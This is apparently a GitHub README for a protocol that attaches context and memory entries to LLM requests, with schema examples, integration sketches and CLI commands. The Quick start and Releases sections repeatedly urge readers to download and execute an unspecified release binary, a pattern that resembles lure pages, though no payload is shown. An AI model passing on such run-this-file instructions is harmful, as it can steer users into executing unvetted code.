AI Drop-in Spec — Simple Protocol for Model Context & Memory
============================================================

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/carlosbrian20/AI-dropin-spec/releases) 🧠🤖

<img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Neural_network.svg" alt="neural network" width="100" align="right">

A user-driven protocol for giving AI models context and memory. It solves model statelessness with a compact, powerful syntax that any system, agent, or developer can adopt. This project targets language models and their orchestration layer. It works with GPT-family, Claude, Gemini, and other LLMs.

Badges and topics
-----------------
- Topics: ai, ai-safety, claude, context-management, gemini, gpt, language-model, llm, prompt-engineering, protocol
- Stable releases: [Download releases](https://github.com/carlosbrian20/AI-dropin-spec/releases) (use the release file as described below)

Table of contents
-----------------
- Quick start
- What this spec does
- Core concepts
- Protocol syntax
- Memory model and life cycle
- Context management patterns
- Prompt-engineering patterns
- Integration guides
  - HTTP API
  - Python
  - JavaScript / Node
- Example flows
  - Single-turn augmentation
  - Multi-turn memory
  - System-level memory bridging
- Security and safety practices
- Testing and validation
- Versioning and compatibility
- Contributing
- License and acknowledgments
- Releases and downloads

Quick start
-----------
1. Open the releases page and download the release file. The release file needs to be downloaded and executed according to your environment:
   - Visit: https://github.com/carlosbrian20/AI-dropin-spec/releases
   - Download the release tarball or binary for your platform.
   - Execute the release file to install CLI tools and spec validators.
2. Use the reference CLI to validate a spec snippet or to apply a drop-in patch to a model request.
3. Follow the examples in this README to write drop-ins and manage state across turns.

If you need a visual badge linking to releases:
[![Get Releases](https://img.shields.io/badge/Get%20Releases-%F0%9F%93%A6-blue?logo=github&style=flat-square)](https://github.com/carlosbrian20/AI-dropin-spec/releases)

What this spec does
-------------------
This protocol defines a compact way to attach contextual signals and memory to AI model requests. It helps maintain state across turns without forcing the model to store data internally. The spec is small. It focuses on:

- A clear syntax for context fragments, memory entries, and policies.
- Rules for merging and resolving conflict across sources.
- Lightweight lifecycle rules for memory (create, read, update, archive).
- Interop with existing prompt templates and agent systems.

The spec targets teams that need:
- Traceable memory changes.
- Predictable context resolution.
- Fine-grained privacy and retention controls.
- Cross-model compatibility.

Core concepts
-------------
Use these terms while you design or implement integrations.

- Drop-in: A structured piece of context that you attach to a model call. It contains metadata and content.
- Memory entry: A persistent drop-in stored in a memory store. It has an ID, version, and retention policy.
- Context frame: The ordered set of drop-ins that a model sees during a request.
- Policy: A rule that governs visibility, merging, retention, and priority.
- Guard: A runtime or compile-time rule that blocks unsafe content from being shared.
- Bridge: A component that translates drop-ins to model-specific prompts or API calls.

Key design goals
----------------
- Predictability: The same ordered inputs produce the same merged context.
- Audibility: Each drop-in keeps provenance metadata.
- Minimalism: Keep syntax tight to lower parsing cost and cognitive load.
- Interop: Map to existing LLM APIs with minimal transformation.

Protocol syntax
---------------
The syntax uses a small JSON-like model that integrates into prompt templates or API payloads. Each drop-in contains a header and a body. The header defines type, id, version, and policy. The body holds content.

Example snippet (human-readable form)
- type: "memory"
- id: "user_pref_123"
- version: "1.0.0"
- priority: 10
- retention: "30d"
- visibility: ["assistant", "system"]
- action: "upsert"
- body:
  - format: "text/plain"
  - value: "User prefers metric units."

A compact JSON example
{
  "dropins": [
    {
      "type": "memory",
      "id": "user_pref_123",
      "version": "1.0.0",
      "priority": 10,
      "retention": "30d",
      "visibility": ["assistant", "system"],
      "action": "upsert",
      "body": {
        "format": "text/plain",
        "value": "User prefers metric units."
      }
    }
  ]
}

Fields explained
- type: memory | context | instruction | policy | hook
- id: string. Must be unique per namespace.
- version: SemVer-style string. Use it for migration and auditing.
- priority: Integer. Higher values win when conflicts arise.
- retention: e.g., "30d", "90d", "permanent". It sets lifecycle rules.
- visibility: list. Who can see this drop-in: assistant, system, user, plugin.
- action: create | upsert | delete | archive
- body: content container. Use format to hint how to render it.

Message transformation
- Bridge components map drop-ins to model-specific inputs.
- For chat models, the bridge converts drop-ins into system messages, user messages, or assistant messages per policy.
- For embedding-based retrieval, the bridge stores body.value in a vector store with id and metadata.

Memory model and life cycle
---------------------------
Memory in this spec follows a clear life cycle. Implementations should expose APIs that match these states. This makes auditing and retention work straightforward.

States
- Created: A new memory entry appears. The system records who created it and when.
- Active: The memory can influence model output. It follows visibility and priority rules.
- Updated: The entry changed. Keep a version history or a diff.
- Archived: The memory no longer influences output but remains for audit.
- Deleted: The memory removes from active datasets. You may keep an audit trail depending on policy.

Retention and policies
- Retention uses human-friendly units (d, h, s).
- Define both retention and erasure policies.
- Policy example: { "retention": "30d", "on_delete": "archive" }

Merging rules
When multiple drop-ins refer to the same id or conflicting content, apply these rules:
1. Compare priorities. Higher priority wins.
2. If priorities tie, use newest version by timestamp.
3. If still tied, use explicit conflict resolution function defined in a policy drop-in.
4. If no rule exists, raise a resolvable conflict event for human review or automated policy.

Visibility
- Visibility controls which agent or system receives the drop-in.
- Example: visibility: ["assistant"] sends the data only as a system message to the model. visibility: ["system"] keeps it internal.
- Use visibility to prevent sensitive content from leaving control channels.

Context management patterns
---------------------------
Follow these patterns when you build systems that feed models.

Short-term context
- Use drop-ins with retention under a session.
- Set action="create" and retention="session".
- Assign low priority for ephemeral signals.

Long-term memory
- Create entries with retention="90d" or "permanent".
- Add provenance to body.metadata: { "source": "user", "method": "explicit" }.
- Use upsert actions to update entries without changing id.

User-driven notes
- Let users create memories explicitly.
- Tag such entries with visibility: ["assistant", "system"] and source: "user".

Agent-mediated edits
- Agents can propose edits. Store them as pending until the user approves.
- Mark proposed edits with action="propose" and a separate change_id.

Prompt-engineering patterns
---------------------------
Use drop-ins to craft prompts that keep model token budgets low and keep intent high.

Compression and summarization
- Store raw long-form content in a memory store.
- Attach a summarized drop-in with priority to present to the model.
- Example flow:
  1. Save long note in memory body.format="text/plain".
  2. Store a summary drop-in body.format="text/summary" with higher priority.
  3. Present the summary in the context frame.

Selective visibility
- Expose only the fields the model needs.
- Use small structured prompts for facts and longer text for background files.

Instruction layering
- Use instruction drop-ins to add run-time controls. Keep them short.
- Example: { "type": "instruction", "body": { "value": "If user asks for account balance, respond with last known balance only." } }

Guardrails
- Use guard drop-ins to apply runtime checks.
- Guard content can block or rewrite a model output before it reaches the user.

Integration guides
------------------

HTTP API (reference)
- The spec defines a small HTTP API for drop-in management. Endpoints:
  - POST /dropins — create or upsert drop-ins
  - GET /dropins/:id — fetch a drop-in
  - DELETE /dropins/:id — archive or delete depending on policy
  - POST /validate — validate a drop-in payload against the spec
  - POST /apply — apply drop-ins to a model payload and return the transformed prompt

Example POST /dropins payload
{
  "dropins": [
    {
      "type": "memory",
      "id": "meeting_pref_321",
      "version": "1.0.0",
      "priority": 5,
      "retention": "180d",
      "visibility": ["assistant"],
      "action": "upsert",
      "body": {
        "format": "text/plain",
        "value": "User prefers meetings at 10:00 AM local time."
      }
    }
  ]
}

Example response
- 200 OK
- body:
{
  "status": "applied",
  "applied": ["meeting_pref_321"],
  "conflicts": []
}

Python integration
- Use the official client or implement your own wrapper.
- Key functions:
  - validate_dropin(payload)
  - push_dropin(payload)
  - resolve_context(context_frame)
  - apply_to_model_request(context_frame, model_request)

Python example (pseudo)
from ai_dropin import client
c = client.Client(api_key="...")

dropin = {
  "type": "memory",
  "id": "user_lang",
  "version": "1.0.0",
  "priority": 20,
  "retention": "365d",
  "visibility": ["assistant"],
  "action": "upsert",
  "body": { "format": "text/plain", "value": "User language: Spanish." }
}

c.push_dropin(dropin)
ctx = c.resolve_context(["user_lang"])
model_input = c.apply_to_model_request(ctx, {"model":"gpt-4.1", "messages": [{"role":"user","content":"Translate hello"}]})

JavaScript / Node integration
- Provide a small wrapper for JS runtimes.
- Key functions mirror Python.

JS example (pseudo)
import { DropinClient } from "ai-dropin-client"
const client = new DropinClient({ token: process.env.TOKEN })

const dropin = { /* same structure as above */ }
await client.pushDropin(dropin)
const ctx = await client.resolveContext(["user_lang"])
const req = client.applyToModel({ model: "gpt-4o", messages: [{ role: "user", content: "Translate hello" }] }, ctx)

Example flows
-------------

Single-turn augmentation
- Use-case: Add user preferences to a one-off request.
- Flow:
  1. Create a drop-in with action="create" and retention="session".
  2. Call apply endpoint. The bridge converts the drop-in into a system message.
  3. Send the model request.

Multi-turn memory
- Use-case: Save user name and recall it in later sessions.
- Flow:
  1. User sets name: push memory drop-in id=user_name value="Ava".
  2. System stores metadata: created_by=user.
  3. On later calls, resolve_context pulls user_name.
  4. Bridge injects a short system message: "User name: Ava".

System-level memory bridging
- Use-case: Sync internal records to live model context.
- Flow:
  1. Export compact records from your CRM.
  2. Map records to memory drop-ins with id pattern "crm:customer:123".
  3. Add priority based on recency.
  4. Use bridge to convert to tokens only when relevant.

Sample prompt translation rules
- Use the following pattern when building a bridge:
  - memory -> system messages for facts and preferences.
  - instruction -> system messages with explicit "do" or "avoid".
  - context -> user messages to give background.
  - policy -> system messages parsed by a policy engine.

Grammar and serial formats
--------------------------
The spec supports two main serial formats:
- JSON: for API and tooling.
- Inline YAML-like blocks: for embedding inside prompts or configs.

Example inline block for prompts
<AI-DROPIN v=1>
- type: memory
  id: user_pref_123
  priority: 10
  body:
    format: text/plain
    value: "User prefers metric units."
</AI-DROPIN>

The bridge extracts the block and merges it into the context frame.

Conflict resolution and events
------------------------------
When conflicts occur, the system generates an event with:
- conflict_id
- candidates (ids, priorities, timestamps)
- resolution_hint (if any)

You may wire the event to:
- Automated resolution functions.
- Human review dashboards.

Prompt-engineering patterns for conflict cases
- Present the highest-priority option as a main fact.
- Offer the model a list of alternative facts labeled with provenance.
- Ask the model to prefer the most recent or highest-priority source.

Privacy, security, and safety
-----------------------------
The spec gives you hooks to control what flows to a model. Use policy fields and guards to manage risk.

Privacy controls
- Use visibility to keep private fields out of model requests.
- Use encryption for sensitive values at rest.
- Audit all changes. Keep write logs.

Retention and erasure
- Honor user requests for deletion by setting action="delete" and retention="erased".
- Implement a background job that adheres to retention rules.

Guard drop-ins
- Use guard drop-ins to define checks before applying drop-ins.
- Guards can block PII, financial data, or any disallowed type.
- Example guard:
  { "type": "guard", "id": "no_pii", "body": { "rule": "regex", "pattern": "\\b\\d{3}-\\d{2}-\\d{4}\\b" } }

Safety patterns
- Keep high-risk instructions in system-only drop-ins.
- Use sandboxed execution for hooks and code that might execute dynamic content.
- Run a policy engine before the bridge converts drop-ins into model input.

Auditing and provenance
- Store who created a drop-in, timestamp, and source.
- Keep versions when entries update.
- Provide an audit endpoint to list changes.

Testing and validation
----------------------
Validate drop-ins before sending them to a live model. The reference validator checks:
- Schema conformance.
- SemVer correctness.
- Valid retention format.
- Visibility values.
- Priority numeric range.

Unit tests
- Test merging rules with mock inputs.
- Test retention tasks with time simulation.
- Test bridge conversions for each target model.

Integration tests
- Run model-skipping tests that check the final prompt without calling an LLM.
- Run end-to-end tests against a staging model.

Example test cases
- Create two drop-ins with same id and different priorities. Expect the higher priority entry to appear in the resolved frame.
- Update a memory and check that version increments and a diff stores in audit.

Performance and scaling
-----------------------
Keep context small. Use memory stores and summaries to limit tokens in each model call.

Strategies
- Index long text in an embedding store. Retrieve only top-k relevant entries when you call the model.
- Use prioritized summaries for high-value facts.
- Use TTL and retention to delete old entries automatically.

Token budget patterns
- Use a shorter summary for high-latency calls.
- Use full context for high-accuracy offline processing.

Bridging to different models
----------------------------
GPT-family
- Map drop-ins to the role-based chat messages.
- Use system messages for global instructions and memory facts.
- Use user messages for background prompts.

Claude
- Use Claude’s system-like top-level instruction features.
- Attach memory drop-ins as contextual framing.

Gemini
- Map drop-ins into Gemini's context window or external memory if available.
- Use explicit instructions for Gemini to prefer memory facts.

Embedding-backed recall
- Embed memory body.value and store with metadata.
- On context resolve, do a semantic search to find relevant entries and add as prioritized drop-ins.

Sample real-world scenarios
---------------------------

Customer support assistant
- Memory drop-ins: customer name, tier, last order id, product preferences.
- On each ticket, resolve relevant drop-ins and inject a short system message with customer facts.
- If the user asks to remove stored data, push a delete action.

Personal productivity agent
- Memory entries: calendar preferences, preferred writing style, shortcuts.
- Use a session context frame to store the current task.
- Summarize long notes and store a summary drop-in for fast recall.

Enterprise CRM sync
- Map CRM fields to drop-ins with id="crm:contact:{id}".
- Use priority based on recency and manual overrides.
- Archive stale entries automatically.

Spec versioning and compatibility
---------------------------------
- Use SemVer for the spec itself.
- Add version metadata to each drop-in.
- Bridge components should check spec version and apply migration rules.

Migration tips
- When changing a field name, accept both names during a transition period.
- Emit deprecation warnings in the validator.

Schema evolution example
- Old: body.value
- New: body.content.value
- Validator supports both and warns on old format.

Contributing
------------
- Fork the repo.
- Add tests for new features.
- Open a pull request with a clear description of the change.
- Sign off with your handle and a short rationale.

Pull request checklist
- Tests pass.
- Validator updated for any schema change.
- Documentation updated with examples.
- If you add a bridge, include at least one integration test.

Community guidelines
- Keep discussions civil and technical.
- Tag sensitive topics with the ai-safety topic and follow the repo's safety policy.

License and acknowledgments
---------------------------
- This project uses a permissive license. See LICENSE file in the repository for exact terms.
- Thanks to the community for feedback on context and memory patterns.
- Credit any third-party diagrams or images you use in your own forks.

Assets and images
-----------------
Use public images to illustrate components. Some examples:
- Neural network schematic: https://upload.wikimedia.org/wikipedia/commons/8/8a/Neural_network.svg
- Generic architecture diagram: https://miro.medium.com/max/1400/1*h7g3z7VbqR3hZ5BDZy6o_w.png
- Use shield tags for releases: https://img.shields.io

Releases and downloads
----------------------
Get the official release artifacts and tools from the releases page. The release file needs to be downloaded and executed to install the CLI and validators for your platform.

- Releases: https://github.com/carlosbrian20/AI-dropin-spec/releases
- Download the matching artifact for your platform.
- Run the installer or executable to install the CLI and validation binaries.
- After installing, run:
  - ai-dropin validate path/to/dropin.json
  - ai-dropin apply path/to/context.json --to model_request.json

CLI quick commands
- Validate a drop-in
  ai-dropin validate ./samples/dropin.json
- List applied drop-ins for a context
  ai-dropin list --context session123
- Apply drop-ins to a draft model request
  ai-dropin apply --context session123 --model gpt-4 --out final_request.json

Real-world implementation checklist
-----------------------------------
Before you deploy:
- Audit retention and privacy settings.
- Implement guard policies and automated checks.
- Test conflict resolution with sample production data.
- Monitor token usage and costs.
- Create a migration plan for schema changes.

Sample dump: end-to-end example
-------------------------------
1. User sets a preference in UI.
2. App calls POST /dropins with a memory drop-in.
3. Server validates and stores the drop-in.
4. On next model call, server calls resolve_context(session_id).
5. Bridge merges high-priority drop-ins into a short system message.
6. App calls the LLM API with merged messages.
7. LLM returns text. Post-processing runs guard checks.
8. If the output touches sensitive info, apply redaction rules and log the event.

FAQ (frequent questions)
------------------------
How do I keep private data out of a model?
- Use visibility to restrict which drop-ins reach the model.
- Use encryption for stored values and decrypt only when allowed.

How do I roll back a change?
- Keep version history and use action="archive" for older versions.
- The audit trail lets you restore a prior version.

Can I use this with retrieval augmentation?
- Yes. Store raw text in a vector store and add summary drop-ins for model input.

How do I handle cross-model differences?
- Use the bridge to adapt drop-in shapes to the target model API.
- Keep a mapping table for role or message differences.

Contacts and channels
---------------------
- Open issues on the repo for spec changes.
- Submit PRs for new bridge adapters.
- Use the discussions tab for patterns and best practices.

Appendix: sample drop-ins and frames
------------------------------------

Sample memory drop-in
{
  "type": "memory",
  "id": "user_contact_009",
  "version": "1.0.2",
  "priority": 15,
  "retention": "365d",
  "visibility": ["assistant"],
  "action": "upsert",
  "body": {
    "format": "application/json",
    "value": "{\"email\":\"ava@example.com\",\"phone\":\"+123456789\"}"
  },
  "metadata": {
    "created_by": "user_ui",
    "created_at": "2025-08-01T12:00:00Z",
    "source": "user"
  }
}

Sample policy drop-in
{
  "type": "policy",
  "id": "safety_pii_block",
  "version": "0.1.0",
  "priority": 100,
  "visibility": ["system"],
  "action": "create",
  "body": {
    "format": "application/json",
    "value": "{\"rules\":[{\"pattern\":\"SSN\",\"action\":\"block\"}]}"
  }
}

Resolved context frame (after merge)
- system: "Memory: User email saved as ava@example.com"
- system: "Policy: pii_block active"
- user: "Draft message: Please confirm shipping address."
- assistant: <previous assistant messages if needed>

Final notes on adoption
-----------------------
Adopt the spec incrementally. Start with a few memory types. Add validators and a CI check for drop-ins. Monitor costs as you increase resolution and retrieval frequency.

Acknowledgments
---------------
This README pulls together practical patterns for context, memory, and prompt engineering. It aims to give teams a clear path to add persistent, auditable state to model-driven systems.

License
-------
See LICENSE file for details.

Files and resources
-------------------
- Schema definition: spec/schemas/dropin.schema.json
- CLI: bin/ai-dropin
- Examples: examples/
- Tests: tests/

End of document